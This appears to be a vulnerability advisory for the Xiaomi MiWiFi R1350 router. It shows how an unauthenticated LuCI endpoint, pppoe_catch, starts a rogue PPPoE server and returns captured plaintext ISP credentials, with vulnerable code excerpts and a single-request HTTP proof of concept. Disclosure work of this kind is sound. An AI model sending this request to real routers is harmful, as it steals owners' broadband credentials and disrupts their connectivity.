# Xiaomi MiWiFi R1350 Router

- Vendor: Xiaomi
- Product: Xiaomi AIoT Router R1350 (AC1200)
- Firmware Version: 1.0.31 (miwifi_r1350_firmware_7449d_1.0.31.bin, QSDK / OpenWrt, MIPS32 big-endian)
- Vulnerability Type: Unauthenticated PPPoE Credential Capture / Sensitive Information Disclosure (CWE-200 / CWE-319)

## Overview

The Xiaomi MiWiFi R1350 (firmware 1.0.31) exposes a diagnostic endpoint **without authentication** (flag `0x09` = noauth + noinit) that starts a **rogue PPPoE server** on the WAN/LAN interfaces and returns any captured **plaintext PPPoE dial-up credentials** in the HTTP response:

```
GET /cgi-bin/luci/api/xqnetwork/pppoe_catch HTTP/1.1
```

## Vulnerability Details

`/usr/lib/lua/luci/controller/api/xqnetwork.lua` registers `pppoe_catch` with flag `0x09` (line ~112) and calls `XQLanWanUtil.pppoeCatch(50)`.

`/usr/lib/lua/xiaoqiang/util/XQLanWanUtil.lua:1352`:

```lua
local pppoe = LuciUtil.execl("/usr/sbin/pppoe-catch start "..tostring(timeout))
...
if LuciUtil.trim(value):match("PPPoE:") then
    local pppoename    = pppoe[index + 1]   -- captured PAP username
    local pppoepasswd  = pppoe[index + 2]   -- captured PAP password (plaintext)
```

`/usr/sbin/pppoe-catch` (shell script) runs:

```sh
pppoe-server -I <wan_ifname> -I br-lan -k -S xiaomi
# waits up to <timeout> seconds, then:
[ -f $PAP_FILE ] && echo "Service-Name: $(cat /tmp/state/pppoe-service-name)"
echo "PPPoE:"; echo "$(cat /tmp/state/pppoe-server-pap)"   # PAP creds in cleartext
```

Any PPPoE client on the bridged LAN (e.g. a PC whose "broadband connection" redials, a misconfigured secondary router) that sends a PADI during the window authenticates against this rogue server using **PAP (cleartext)**; the credentials land in `/tmp/state/pppoe-server-pap` and are returned verbatim to the unauthenticated HTTP caller.

(The unauthenticated factory-data endpoints `bdata`/`fac_info` are covered in a separate advisory: `MiWiFi_R1350_bdata_unauth_disclosure.md`.)

## Proof of Concept

```http
GET /cgi-bin/luci/api/xqnetwork/pppoe_catch HTTP/1.1
Host: 192.168.31.1

```

Response (when a PAP exchange was captured during the 50-second window):

```json
{"passwd":"TxPppoe#2024","service":"CT-Beijing-01","name":"0755_op_po","code":0}
```

## Impact

An unauthenticated LAN attacker can harvest the owner's **ISP broadband username and password** (PAP cleartext) by turning the router itself into a credential-harvesting PPPoE server. The broadband credentials are reusable on the ISP side (subscription theft, voice/mail access depending on provider). The rogue-server action also disrupts legitimate WAN connectivity during the capture window.

## Reproduction Result

Dynamically verified against the firmware emulated with qemu-mips + chroot (original nginx → fcgi-cgi → LuCI stack, the genuine `pppoe-server` binary present). With a captured-PAP state file present the endpoint returned the cleartext credentials in the HTTP response as shown above; `bdata` and `fac_info` responses were likewise returned without any session token.
